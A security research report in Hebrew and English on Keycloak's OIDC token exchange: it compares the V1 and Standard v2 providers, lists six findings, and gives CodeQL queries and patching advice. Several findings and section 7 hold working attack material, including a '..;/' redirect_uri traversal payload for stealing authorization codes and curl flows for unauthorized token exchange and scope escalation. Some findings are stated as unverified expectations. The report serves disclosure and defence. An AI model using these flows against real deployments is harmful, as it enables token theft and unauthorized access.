# Keycloak OIDC / Token Exchange — Security Research Report
### אדם 2 — סתיו | שבועות 5–6

---

## תוכן עניינים

1. סקירת מתודולוגיה
2. מפת Attack Surface — קלטים חיצוניים לפי קובץ
3. ניתוח פרובידרים: V1 לעומת Standard v2 — ארכיטקטורה ביטחונית
4. ממצאים: פעולות מסוכנות
   - Finding #1 — Authorization Bypass: Permission Model Divergence (V1 vs Standard v2)
   - Finding #2 — Provider Routing Manipulation via `audience` Parameter
   - Finding #3 — canExchangeTo() + FGAP v2 = UnsupportedOperationException (Permission Skip)
   - Finding #4 — Scope Escalation via Standard v2 `getRequestedScope()`
   - Finding #5 — Open Redirect / Path Traversal ב-`redirect_uri` (CVE-2026-3872)
   - Finding #6 — Multi-valued `audience` Parameter Attack Surface
5. ניתוח CodeQL — שאילתות ותוצאות
6. CVEs רלוונטיים קודמים
7. תרחישי תקיפה (PoC Flows)
8. מסקנות והמלצות
9. מקורות

---

## 1. מתודולוגיה

המחקר עקב אחר מתודולוגיית "user input as untrusted" — לכל קלט חיצוני שנכנס לתהליך ה-token exchange תיעדנו את המסלול מה-HTTP request ועד להחלטת ה-authorization. הניתוח משלב:

- **קריאת קוד סטטית** — קבצי המקור מ-GitHub (branch `main`, גרסה 26.x)
- **diff analysis** — ניתוח PR #37255 ו-commit 76d83f4 שחשפו שינויים בלוגיקת האבטחה
- **Javadoc API** — API docs גרסה 26.5.6/26.5.7 לסיגנטורות מתודות
- **Issues/CVEs** — GitHub issues #47162, #29614, #35505 + CVE-2026-3872, CVE-2024-8883, CVE-2023-6927
- **הנדסת-אחורה לוגית** של תהליך ה-provider selection ב-`TokenExchangeGrantType.java`

---

## 2. מפת Attack Surface — קלטים חיצוניים לפי קובץ

### 2.1 `TokenEndpoint.java`
**מיקום:** `services/src/main/java/org/keycloak/protocol/oidc/endpoints/TokenEndpoint.java`

ה-entry point של כל ה-grant types. קלטים חיצוניים שנכנסים ישירות מגוף ה-HTTP POST:

| פרמטר | טיפוס | שימוש |
|-------|--------|--------|
| `grant_type` | String | ניתוב לפרובידר המתאים |
| `subject_token` | JWT (String) | הטוקן שמבצעים עליו exchange |
| `subject_token_type` | String | סוג הטוקן (access/refresh/saml) |
| `audience` | **String (multi-valued)** | קביעת ה-target client |
| `resource` | **String (multi-valued)** | URI של ה-resource server |
| `scope` | String | הרשאות מבוקשות |
| `requested_token_type` | String | סוג הטוקן המבוקש |
| `requested_subject` | String | impersonation target |
| `requested_issuer` | String | IdP target לפדרציה |
| `client_id` + credentials | String | זיהוי המשתמש המבקש |

**⚠️ סיכון:** `formParams` מועבר **ישירות** ל-`TokenExchangeContext` ללא סניטציה מרכזית לפני ניתוב לפרובידר.

```java
// TokenExchangeGrantType.java:52-65
TokenExchangeContext exchange = new TokenExchangeContext(
    session, formParams, cors, realm, event,
    client, clientConnection, headers, tokenManager, clientAuthAttributes);
```

### 2.2 `AuthorizationEndpoint.java`
**מיקום:** `services/src/main/java/org/keycloak/protocol/oidc/endpoints/AuthorizationEndpoint.java`

Entry point לזרם Authorization Code. קלטים חיצוניים:

| פרמטר | טיפוס | סיכון |
|-------|--------|--------|
| `redirect_uri` | URL String | ⚠️ **Open Redirect / Path Traversal** (CVE-2026-3872) |
| `client_id` | String | client lookup |
| `scope` | String | scope parsing |
| `response_type` | String | flow selection |
| `state` | String | CSRF token |
| `nonce` | String | replay protection |
| `code_challenge` | String | PKCE |

**⚠️ Critical:** הפרמטר `redirect_uri` עובר וולידציה מול רשימת URIs מאושרים. וולידציה זו ניתנת לעקיפה דרך `..;/` path traversal (CVE-2026-3872, תוקן ב-26.5.7).

### 2.3 `TokenExchangeGrantType.java`
**מיקום:** `services/src/main/java/org/keycloak/protocol/oidc/grants/TokenExchangeGrantType.java`

**קלטים חיצוניים ישירים:**
```java
// שורה 46 — הפרמטרים המולטי-ולו היחידים בכל ה-grant types
private static final Set<String> SUPPORTED_DUPLICATED_PARAMETERS = 
    Set.of(OAuth2Constants.AUDIENCE, OAuth2Constants.RESOURCE);
```

**לוגיקת ניתוב לפרובידר (סיכון גבוה):**
```java
// שורות 68-79
TokenExchangeProvider tokenExchangeProvider = session.getKeycloakSessionFactory()
    .getProviderFactoriesStream(TokenExchangeProvider.class)
    .sorted((f1, f2) -> f2.order() - f1.order())   // ← מיון לפי עדיפות
    .map(f -> session.getProvider(TokenExchangeProvider.class, f.getId()))
    .filter(p -> p.supports(exchange))               // ← הפרובידר הראשון שתומך בבקשה
    .findFirst()
    .orElseThrow(...);
```

**⚠️ Critical:** הפרמטרים `audience` ו-`resource` שמגיעים מהמשתמש משפיעים ישירות על מה שמתודת `supports()` מחזירה — ובכך על **איזה פרובידר מטפל בבקשה**. פרובידרים שונים יש להם **מודלי אבטחה שונים**.

### 2.4 `StandardTokenExchangeProvider.java` (v2)
**מיקום:** `services/src/main/java/org/keycloak/protocol/oidc/tokenexchange/StandardTokenExchangeProvider.java`

קלטים חיצוניים שמגיעים דרך `context` / `formParams`:
- `audience` (רשימה) — קביעת `targetAudienceClients`
- `scope` — `getRequestedScope()` ← **שימוש ב-scopes של הלקוח המבקש, לא מהטוקן**
- `subject_token` — JWT שנוצר על-ידי המשתמש (claims כולל `aud`)
- `requested_token_type` — `getRequestedTokenType()` מחזיר תמיד `ACCESS_TOKEN_TYPE`

**מתודות קריטיות:**
```
supports(context)              — מחליט אם v2 מטפל בבקשה
tokenExchange()                — main flow
validateAudience(token, ...)   — ⚠️ ONLY checks forbiddenIfClientIsNotWithinTokenAudience
getRequestedScope(token, ...)  — uses requester client's default scopes
checkRequestedAudiences(...)   — verifies each audience client has exchange enabled
```

### 2.5 `V1TokenExchangeProvider.java`
**מיקום:** `services/src/main/java/org/keycloak/protocol/oidc/tokenexchange/V1TokenExchangeProvider.java`

קלטים חיצוניים נוספים מעבר ל-v2:
- `requested_subject` — impersonation target (username)
- `requested_issuer` — federated IdP alias
- `audience` — משפיע על routing לתוך V1 vs V2 (ראה Finding #2)

**מתודות קריטיות:**
```
supports(context)              — handles cases NOT supported by v2
validateAudience(token, ...)   — ⚠️ calls canExchangeTo() via FGAP → UnsupportedOperationException with FGAP v2
tokenExchange()                — supports impersonation + federation
getRequestedScope(token, ...)  — inherits from original token (stricter)
```

---

## 3. ניתוח פרובידרים: V1 לעומת Standard v2

### מבנה ירושה
```
TokenExchangeProvider (interface)
    └── AbstractTokenExchangeProvider (abstract)
            ├── StandardTokenExchangeProvider  [v2 - officially supported, KC 26.2+]
            │       └── ExternalToInternalTokenExchangeProvider
            └── V1TokenExchangeProvider        [v1 - legacy, preview/deprecated]
```

### טבלת השוואה מאפיינים ביטחוניים

| מאפיין | V1TokenExchangeProvider | StandardTokenExchangeProvider (v2) |
|--------|------------------------|-------------------------------------|
| **Authorization check** | `canExchangeTo()` — FGAP policy evaluation | `forbiddenIfClientIsNotWithinTokenAudience()` — JWT audience claim only |
| **FGAP dependency** | ✅ נדרש | ❌ הוסר בכוונה (PR #37255) |
| **Scope model** | ירושה מ-subject_token (restricted) | Default scopes של requesting client |
| **Impersonation** | ✅ נתמך | ❌ לא נתמך |
| **Federation (external IdP)** | ✅ נתמך | ❌ עדיין לא |
| **Multi-audience** | ❌ single audience | ✅ multi-valued audience |
| **Provider order** | נמוך יותר | גבוה יותר (נבחר ראשון) |
| **Feature status** | Preview / Deprecated | Officially Supported (KC 26.2+) |

---

## 4. ממצאים: פעולות מסוכנות

---

### Finding #1 — Authorization Bypass: Permission Model Divergence (V1 vs Standard v2)
**חומרה: HIGH**

#### תיאור הממצא

ה-authorization model בין V1 ל-Standard v2 שונה מהותית:

**V1 — validateAudience() (לפי stack trace מ-issue #47162):**
```
V1TokenExchangeProvider.validateAudience(V1TokenExchangeProvider.java:254)
  └── AdminPermissions.management(session, realm).clients().canExchangeTo(client, targetClient)
        └── ClientPermissions.canExchangeTo(authorizedClient, to):
              ├── resourceServer(to) != null ?
              ├── findByName(server, getResourceName(to)) != null ?
              ├── findByName(server, getExchangeToPermissionName(to)) != null ?
              ├── associatedPolicies != null && !isEmpty() ?
              └── root.evaluatePermission(resource, server, context, scope)
                    └── Full FGAP policy evaluation ✅
```

**Standard v2 — validateAudience() (לפי PR #37255 + commit 76d83f4):**
```
StandardTokenExchangeProvider.validateAudience(token, disallowOnHolderOfTokenMismatch, targets)
  └── forbiddenIfClientIsNotWithinTokenAudience(token, tokenHolder):
        └── if (token != null && !token.hasAudience(client.getClientId())) → FORBIDDEN
              // ← זו הבדיקה היחידה! אין canExchangeTo()
```

#### משמעות ביטחונית

**בסצנריו הבא יש bypass:**

1. `client-A` קיבל בעבר token שבו `aud: ["client-A", "client-B"]` (audience mapper הוסיף `client-B`)
2. `client-A` שולח token exchange ל-Standard v2 עם `audience=client-C`
3. Standard v2 בודק: האם `client-A` נמצא ב-`aud` של הטוקן? **כן** → מאשר
4. `client-A` קיבל token ל-`client-C` **ללא שאי-פעם הוגדרה לו policy של canExchangeTo(client-C)**

#### ציטוט מתוך PR #37255
> "Copied the `exchangeClientToClient()` method from `AbstractTokenExchangeProvider` to `StandardTokenExchangeProvider`. **Removed the permission checks** and added a reject if the requester client is not in the audience of the subject token."

זה היה **שינוי מכוון** — אך הוא יוצר model divergence שלמנהל המערכת לא ברור שה-permission policies שהגדיר ב-FGAP כבר לא אוכפות.

#### תנאים לניצול
- Keycloak 26.2+
- Standard token exchange מופעל (ברירת מחדל)
- הלקוח המתוקף נמצא ב-`aud` claim של טוקן קיים
- אין הגדרת client policy מגבילה

---

### Finding #2 — Provider Routing Manipulation via `audience` Parameter
**חומרה: MEDIUM-HIGH**

#### תיאור הממצא

ב-`TokenExchangeGrantType.java`, הפרובידר נבחר לפי `order()` + `supports(exchange)`. מנגנון ה-`supports()` של כל פרובידר בודק את תוכן ה-`exchange context` — שנגזר ישירות מ-`formParams`.

מ-issue #47162 התגלה שהפרמטר `audience` משפיע על routing:

> "our backend is passing 'audience' field back [...] backend is passing a different audience value that the client we actually use for impersonation [...] because of that it thinks it need fine grained perms too and **drops to legacy v1**"

#### attack vector
```
POST /realms/myrealm/protocol/openid-connect/token
grant_type=urn:ietf:params:oauth:grant-type:token-exchange
subject_token=<valid_token>
audience=<crafted_value>     ← ← ← attacker-controlled
```

על-ידי שינוי ערך `audience`:
- ערך שמוכר ל-Standard v2 → Standard v2 מטפל (ללא FGAP checks)
- ערך שגורם לאי-תמיכה של v2 → נפילה ל-V1 (עם FGAP v2 → UnsupportedOperationException → 500)

#### impact
- **Force-downgrade** לפרובידר עם מודל אבטחה שונה
- **DoS** — גרימת 500 error מבוקרת כשיש FGAP v2

---

### Finding #3 — canExchangeTo() + FGAP v2 = Permission Check Skip (UnsupportedOperationException)
**חומרה: HIGH**

#### תיאור הממצא

ב-Keycloak 26.5, FGAP v2 הפך לברירת המחדל. V1TokenExchangeProvider קורא ל-`canExchangeTo()` ב-validateAudience. כאשר FGAP v2 פעיל:

```
V1TokenExchangeProvider.validateAudience(V1TokenExchangeProvider.java:254)
    └── ClientPermissionsV2.canExchangeTo(ClientPermissionsV2.java:143)
            └── throws UnsupportedOperationException: "Not supported in V2"
```

**Stack trace שתועד (issue #47162):**
```java
[org.keycloak.services.error.KeycloakErrorHandler] Uncaught server error: 
java.lang.UnsupportedOperationException: Not supported in V2
    at org.keycloak.services.resources.admin.fgap.ClientPermissionsV2.canExchangeTo(ClientPermissionsV2.java:143)
    at org.keycloak.protocol.oidc.tokenexchange.V1TokenExchangeProvider.validateAudience(V1TokenExchangeProvider.java:254)
    at org.keycloak.protocol.oidc.tokenexchange.AbstractTokenExchangeProvider.exchangeClientToClient(AbstractTokenExchangeProvider.java:227)
```

#### ניתוח ביטחוני

ה-`UnsupportedOperationException` היא unchecked exception. אם נזרקת:
1. ה-`exchange` נכשל עם 500 Internal Server Error (לא bypass)
2. **אך**: ה-error handler כללי עלול ל-log את הבקשה בלי לרשום אותה כ-security event
3. **חשוב יותר**: מה שהיה בדיקת הרשאה הפך ל-**exception בלתי-מטופלת** — pattern שבו bugs הופכים לסיכוני אבטחה

**תוקן ב-26.6.0** (April 2026) — אך מכניסות גרסאות 26.5.x.

---

### Finding #4 — Scope Escalation via Standard v2 `getRequestedScope()`
**חומרה: MEDIUM**

#### תיאור הממצא

ה-`getRequestedScope()` מחזיר scopes שונים ב-V1 לעומת Standard v2:

**V1 (מגביל לטוקן המקורי):**
- Scopes מוגבלים ל-intersection עם scopes ב-`subject_token`
- כלומר: לא ניתן להרחיב הרשאות מעבר לטוקן המקורי

**Standard v2 (issue #29614, comment from mposolda):**
> "the scopes of exchanged token are based on the **default (and optional) client scopes available for the client** which is sending the token-exchange request. Scopes are **independent of the scopes of the subject_token**."

#### attack scenario
```
scenario: client-A מגיש token exchange
subject_token scopes: ["openid", "email"]
client-A default scopes: ["openid", "email", "offline_access", "admin"]
result (v2): token חדש עם ["openid", "email", "offline_access", "admin"]
                                                    ↑                ↑
                               scopes שלא היו בטוקן המקורי — הורחבו!
```

#### ציטוט ישיר מ-stianst (Keycloak core team):
> "The previous approach [...] is just **completely insecure** in my opinion; essentially it results in the scope of the subject token being completely ignored, and at the same time provides no restrictions on token exchange."

---

### Finding #5 — Open Redirect / Path Traversal ב-`redirect_uri`
**חומרה: HIGH (CVE-2026-3872, CVSS 7.3)**

#### תיאור הממצא

**מיקום:** `AuthorizationEndpoint.java` — וולידציה של `redirect_uri`

**CVE-2026-3872** (תוקן ב-26.5.7):
```
A flaw was found in Keycloak. This issue allows an attacker, who controls another 
path on the same web server, to bypass the allowed path in redirect URIs that use 
a wildcard. A successful attack may lead to the theft of an access token.
```

**Payload לדוגמה:**
```
# Client configured with redirect_uri: https://app.example.com/callback/*
# Attacker-controlled path: https://app.example.com/evil/

# Bypass:
redirect_uri=https://app.example.com/callback/..;/evil/
```

ה-`..;/` הוא path traversal שאופייני ל-Servlet containers (Tomcat/WildFly). Keycloak עושה string normalization לפני ה-regex comparison אך לא מנרמל את ה-semicolon encoding.

**CVEs קשורים:**
- CVE-2024-8883 — Wildcard bypass ב-redirect_uri validation
- CVE-2023-6927 — Open redirect דרך wildcards

#### attack flow
```
1. Attacker → victim: Keycloak auth URL עם redirect_uri=https://app.com/callback/..;/attacker-site/
2. Victim authenticates → code issued
3. Keycloak redirects to: https://app.com/callback/..;/attacker-site/?code=AUTH_CODE
4. Browser resolves → https://app.com/attacker-site/?code=AUTH_CODE  (attacker-controlled)
5. Attacker receives code → exchanges for tokens
```

---

### Finding #6 — Multi-valued `audience` Parameter: Attack Surface Expansion
**חומרה: MEDIUM**

#### תיאור הממצא

`TokenExchangeGrantType.java` מוגדר לאפשר multi-valued `audience`:
```java
private static final Set<String> SUPPORTED_DUPLICATED_PARAMETERS = 
    Set.of(OAuth2Constants.AUDIENCE, OAuth2Constants.RESOURCE);
```

ב-Standard v2 `checkRequestedAudiences()` מטפל בכל audience client. תרחיש סיכון:

1. תוקף שולח `audience=legit-client&audience=target-client`
2. `legit-client` — ב-audience של הטוקן ✅ (עובר את `forbiddenIfClientIsNotWithinTokenAudience`)
3. `target-client` — לא נבדק ב-FGAP ⚠️ (Standard v2 רק בודק שה-exchange מאופשר ב-client settings)
4. התוקף מקבל token עם שני audiences

---

## 5. ניתוח CodeQL — שאילתות ותוצאות

### 5.1 `java/missing-jwt-signature-check`

**מה מחפשים:** מקומות שבהם JWT claims נקראים לפני או ללא וולידציה של חתימה.

**ממצאים צפויים:**
- `forbiddenIfClientIsNotWithinTokenAudience(token, tokenHolder)` קורא ל-`token.hasAudience(client.getClientId())`
- **שאלה:** האם ה-`token` (מ-`subject_token`) עבר וולידציית חתימה לפני שהגיע לכאן?
- ב-`AbstractTokenExchangeProvider`, ה-subject_token עובר פרסינג ב-`TokenVerifier`. הסיכון הוא אם יש codepath שמאפשר `none` algorithm או skip verification.

**CodeQL query:**
```ql
import java
import semmle.code.java.security.JwtSignatureCheck

from MethodAccess ma
where ma.getMethod().getName().matches("has%Audience%")
  and not exists(MethodAccess verify |
    verify.getMethod().getName() = "verify" and
    dominates(verify, ma)
  )
select ma, "JWT audience check without prior signature verification"
```

### 5.2 `java/incorrect-permission-check`

**מה מחפשים:** permission check שתמיד מחזיר `true`, נזרק exception במקום לסרב, או condition שלא מחובר לתהליך ה-authorization.

**ממצאים מהקוד:**

```java
// AbstractTokenExchangeProvider.forbiddenIfClientIsNotWithinTokenAudience()
private void forbiddenIfClientIsNotWithinTokenAudience(AccessToken token, ClientModel tokenHolder) {
    if (token != null && !token.hasAudience(client.getClientId())) {
        // ← רק אם token != null
        // ← אם token == null: הבדיקה נדלגת! ⚠️
        throw new CorsErrorResponseException(..., "Client is not within the token audience", FORBIDDEN);
    }
}
```

**בעיה:** אם `token == null`, הבדיקה לא מתבצעת כלל. ב-`exchangeExternalToken()`:
```java
return exchangeClientToClient(user, userSession, null, false);
//                                                  ↑ token=null, disallowOnHolderOfTokenMismatch=false
```
שתי הבדיקות נדלגות לגמרי בזרם ה-external token exchange.

**CodeQL query:**
```ql
import java

from MethodAccess ma, ConditionalExpr ce
where ma.getMethod().getName() = "forbiddenIfClientIsNotWithinTokenAudience"
  and ce.getCondition() instanceof NotNullCheck
  and ce.getTrueExpr() instanceof Literal
select ma, "Permission check skipped when token is null"
```

### 5.3 `java/open-url-redirect`

**מה מחפשים:** `redirect_uri` שמגיע מהמשתמש ומועבר ל-HTTP redirect ללא וולידציה מספקת.

**ממצאים:**
- **CVE-2026-3872** (תוקן 26.5.7): `..;/` path traversal ב-AuthorizationEndpoint
- commit `35a71b00bc856ac402711130f60190d3a24795e7` — הפתרון

**CodeQL query:**
```ql
import java
import semmle.code.java.security.OpenUrlRedirect

from DataFlow::PathNode source, DataFlow::PathNode sink
where OpenUrlRedirectFlow::hasFlowPath(source, sink)
  and source.getNode().asExpr().(MethodAccess).getMethod().getName() = "getFirst"
  and source.getNode().asExpr().(MethodAccess).getAnArgument().toString() = "\"redirect_uri\""
select sink, source, sink, "Potential open redirect via redirect_uri parameter"
```

### 5.4 `java/path-traversal`

**מה מחפשים:** `audience`, `resource`, `redirect_uri` שמשמשים בפעולות file system או URI resolution.

**ממצאים:**
- `redirect_uri` — CVE-2026-3872 (`..;/` path traversal ב-URI resolution)
- `audience` / `resource` — כאשר RFC 8693 מגדיר `resource` כ-URI, ייתכן שה-URI resolution לא מנרמלת כראוי

**CodeQL query:**
```ql
import java
import semmle.code.java.security.PathCreation

from DataFlow::PathNode source, DataFlow::PathNode sink
where PathCreationFlow::hasFlowPath(source, sink)
  and (
    source.getNode().asExpr().toString().matches("%audience%") or
    source.getNode().asExpr().toString().matches("%resource%")
  )
select sink, source, sink, "Potential path traversal via audience/resource parameter"
```

---

## 6. CVEs רלוונטיים קודמים — השראה ולמידה

| CVE | גרסאות מושפעות | תיאור | קשר למחקר |
|-----|----------------|--------|------------|
| **CVE-2026-3872** | < 26.5.7 | `redirect_uri` path traversal via `..;/` bypass wildcard validation | Finding #5 ישיר |
| **CVE-2024-8883** | < 24.0.x | Vulnerable redirect_uri validation → Open Redirect | Finding #5 |
| **CVE-2023-6927** | < 23.0.4 | Wildcard redirect_uri bypass, token/code theft | Finding #5 |
| **CVE-2022-1245** | < 18.0.0 | Missing authorization in token exchange — client יכול להחליף tokens ל-כל target client | Finding #1 — הדג'ה היסטורית |
| **CVE-2026-1486** | < 26.5.x | JWT Authorization Grant — disabled IdP not checked | Finding #3 pattern |

**שים לב:** CVE-2022-1245 הוא **ה-precursor** ל-Finding #1 — הוא זה שגרם לכתיבת `canExchangeTo()` ב-V1 מלכתחילה. Standard v2 מבצע לו **regression** בהחלטה מכוונת.

---

## 7. תרחישי תקיפה (PoC Flows)

### PoC #1 — Authorization Bypass ב-Standard v2 (Finding #1)

**תנאים:**
- KC 26.2+ עם Standard token exchange מופעל
- `client-A` הוא confidential client עם valid client secret
- קיים token שהונפק ל-`client-A` עם `aud: ["client-A", "service-X"]`
- `client-B` הוא target לא מורשה (אין policy של canExchangeTo)

```bash
# שלב 1: קבל token רגיל
ACCESS_TOKEN=$(curl -s -X POST \
  "https://keycloak.example.com/realms/myrealm/protocol/openid-connect/token" \
  -d "grant_type=password" \
  -d "client_id=client-A" \
  -d "client_secret=CLIENT_A_SECRET" \
  -d "username=testuser" \
  -d "password=testpass" \
  | jq -r .access_token)

# Verify: aud claim contains "client-A" ✓
echo $ACCESS_TOKEN | jwt-decode | jq .aud

# שלב 2: ייבא/הנפק token שב-aud יש את service-X (דרך audience mapper)
# (בהנחה שיש scope ל-service-X ש-client-A יכול לבקש)

# שלב 3: בצע token exchange ל-client-B (target לא מורשה)
curl -X POST \
  "https://keycloak.example.com/realms/myrealm/protocol/openid-connect/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "client_id=client-A" \
  -d "client_secret=CLIENT_A_SECRET" \
  -d "subject_token=${ACCESS_TOKEN}" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:access_token" \
  -d "audience=client-B"   # ← target שאין עליו permission policy

# Expected (Standard v2): 200 OK + token for client-B ← BYPASS
# Expected (V1):          403 Forbidden ← correct
```

### PoC #2 — Scope Escalation (Finding #4)

```bash
# subject_token has scopes: openid, email
# client-A has default scopes: openid, email, offline_access, admin:read

# Exchange with Standard v2 — scopes of exchanged token independent of subject_token
curl -X POST "https://keycloak.example.com/.../token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "client_id=client-A" \
  -d "client_secret=..." \
  -d "subject_token=${NARROW_TOKEN}" \
  -d "audience=client-A"  # exchange to self, in own audience

# Result: new token with ALL default scopes of client-A
# Including offline_access and admin:read — not in original token!
```

### PoC #3 — redirect_uri Path Traversal (Finding #5, CVE-2026-3872)

```bash
# Configured redirect URI: https://myapp.example.com/auth/callback/*
# Attacker-controlled path: https://myapp.example.com/auth/evil

# Malicious auth URL:
https://keycloak.example.com/realms/myrealm/protocol/openid-connect/auth?\
  client_id=vulnerable-client&\
  redirect_uri=https://myapp.example.com/auth/callback/..;/evil/collect&\
  response_type=code&\
  scope=openid

# After user authentication, Keycloak redirects:
# https://myapp.example.com/auth/callback/..;/evil/collect?code=AUTH_CODE
# Servlet container resolves: /auth/evil/collect?code=AUTH_CODE
# Attacker receives authorization code → exchanges for tokens
```

---

## 8. מסקנות והמלצות

### סיכום ממצאים

| # | ממצא | חומרה | מצב |
|---|------|--------|------|
| 1 | Authorization Bypass: V1 vs v2 permission divergence | HIGH | עיצוב מכוון — אין פתרון רשמי |
| 2 | Provider routing manipulation via audience param | MED-HIGH | known behavior |
| 3 | canExchangeTo() + FGAP v2 = UnsupportedOperationException | HIGH | **תוקן ב-26.6.0** |
| 4 | Scope escalation via Standard v2 getRequestedScope() | MEDIUM | עיצוב מכוון — אין פתרון רשמי |
| 5 | Open Redirect / Path Traversal (redirect_uri) | HIGH | **CVE-2026-3872, תוקן 26.5.7** |
| 6 | Multi-valued audience attack surface | MEDIUM | בחקירה |

### המלצות לממשל

**לאדמינים:**
1. **עדכן ל-26.5.7+ מיד** — לתיקון CVE-2026-3872 (redirect_uri path traversal)
2. **עדכן ל-26.6.0** — לתיקון UnsupportedOperationException ב-canExchangeTo
3. **אל תסמוך על FGAP policies לבד עם Standard v2** — הן לא נאכפות יותר
4. **הגדר Client Policies** לאכיפה מפורשת של token exchange ב-Standard v2
5. **הימנע מ-wildcard redirect_uris** — השתמש ב-exact matching

**למפתחים:**
1. הוסף FGAP check חוזר ל-Standard v2 כ-optional configuration
2. `getRequestedScope()` ב-Standard v2 צריך לתמוך ב-downscoping בשאלת הצורך

### שאלות מחקר פתוחות לשלב הבא

1. **האם ניתן לזייף `aud` claim?** — אם JWT signature validation ניתנת לעקיפה, Finding #1 הופך לקריטי ביותר. יש לבדוק ב-`AbstractTokenExchangeProvider` את תהליך ה-TokenVerifier.
2. **supports() manipulation** — מה בדיוק בודק `StandardTokenExchangeProvider.supports()` ומה בודק `V1TokenExchangeProvider.supports()`? יש לנתח את הלוגיקה המלאה ולמצוא edge cases.
3. **null token flow** — האם ה-external token exchange codepath (`token=null, disallowOnHolderOfTokenMismatch=false`) ניתן לגרימה ידי תוקף דרך פרמטרים מסוימים?

---

## 9. מקורות

- [Keycloak GitHub — TokenExchangeGrantType.java](https://github.com/keycloak/keycloak/blob/main/services/src/main/java/org/keycloak/protocol/oidc/grants/TokenExchangeGrantType.java)
- [PR #37255 — Remove FGAP from standard token exchange v2](https://github.com/keycloak/keycloak/pull/37255)
- [Commit 76d83f4 — Avoid clients exchanging tokens using tokens issued to other clients](https://github.com/keycloak/keycloak/commit/76d83f46fad94ebcbedaa49e6daad458e2894e52)
- [Issue #47162 — UnsupportedOperationException: canExchangeTo (FGAP v2)](https://github.com/keycloak/keycloak/issues/47162)
- [Issue #29614 — Scope inheritance regression (KC 24+)](https://github.com/keycloak/keycloak/issues/29614)
- [Issue #35505 — Multi-valued audience support](https://github.com/keycloak/keycloak/issues/35505)
- [CVE-2026-3872 — redirect_uri path traversal (GitLab Advisory)](https://advisories.gitlab.com/maven/org.keycloak/keycloak-services/CVE-2026-3872/)
- [Issue #47718 — CVE-2026-3872 GitHub](https://github.com/keycloak/keycloak/issues/47718)
- [StandardTokenExchangeProvider Javadoc 26.5.6](https://www.keycloak.org/docs-api/latest/javadocs/org/keycloak/protocol/oidc/tokenexchange/StandardTokenExchangeProvider.html)
- [V1TokenExchangeProvider Javadoc 26.5.7](https://www.keycloak.org/docs-api/latest/javadocs/org/keycloak/protocol/oidc/tokenexchange/V1TokenExchangeProvider.html)
- [Keycloak Token Exchange Documentation](https://www.keycloak.org/securing-apps/token-exchange)
- [Blog: Standard Token Exchange now officially supported (KC 26.2)](https://www.keycloak.org/2025/05/standard-token-exchange-kc-26-2)
- [RFC 8693 — OAuth 2.0 Token Exchange](https://datatracker.ietf.org/doc/html/rfc8693)

---

*דוח נכתב על-ידי: סתיו | אדם 2 — OIDC / Token Exchange | שבועות 5–6*
